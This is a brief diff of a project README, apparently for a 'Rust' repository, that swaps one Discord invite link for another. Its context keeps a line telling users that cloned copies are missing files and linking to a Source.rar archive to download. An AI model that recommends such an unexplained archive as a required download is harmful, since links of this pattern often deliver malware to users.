@@ -10,4 +10,4 @@
 
 ### If Open Source cloned, some files are missing. for you to load here [Click Here](https://github.com/Speedyreal/Rust/releases/download/Rust/Source.rar)
 
-### Join Discord : https://discord.gg/YV9Ut3q4Yf
+## [Discord New Server Link](https://discord.gg/4xVkxj4cv4)
